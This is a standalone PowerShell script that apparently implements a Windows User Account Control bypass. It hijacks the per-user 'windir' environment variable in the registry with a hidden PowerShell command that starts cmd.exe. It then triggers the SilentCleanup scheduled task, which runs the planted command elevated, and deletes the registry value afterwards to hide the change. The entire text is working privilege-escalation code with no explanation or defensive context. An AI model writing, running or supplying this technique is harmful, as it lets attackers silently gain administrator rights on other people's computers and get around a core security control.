if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {} else 
{
	$registryPath = "HKCU:\Environment";
	$Name = "windir";
	$PSCommandPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -noexit -command start-process cmd.exe";
	$Value = "$PSCommandPath;#";
	Set-ItemProperty -Path $registryPath -Name $name -Value $Value;
	schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null;
	Remove-ItemProperty -Path $registryPath -Name $name
};
